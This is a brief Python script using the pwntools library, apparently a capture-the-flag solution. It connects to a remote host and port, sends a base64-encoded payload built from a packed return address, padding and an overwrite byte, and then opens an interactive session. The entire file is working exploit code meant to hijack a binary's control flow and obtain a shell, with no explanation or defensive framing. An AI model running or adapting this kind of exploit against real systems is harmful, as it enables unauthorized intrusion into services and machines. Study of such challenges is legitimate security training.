from pwn import *
import base64

while(True):
	# io = process('./pwn')
	io = remote('111.200.241.244', 61280)

	s1 = p32(0x8049278) + b'AAAA' + b'\x6C'
	s2 = base64.b64encode(s1)

	print(s2)

	# pause()
	try:
		io.sendline(s2)
		io.interactive()
	except BrokenPipeError:
		io.close()
		break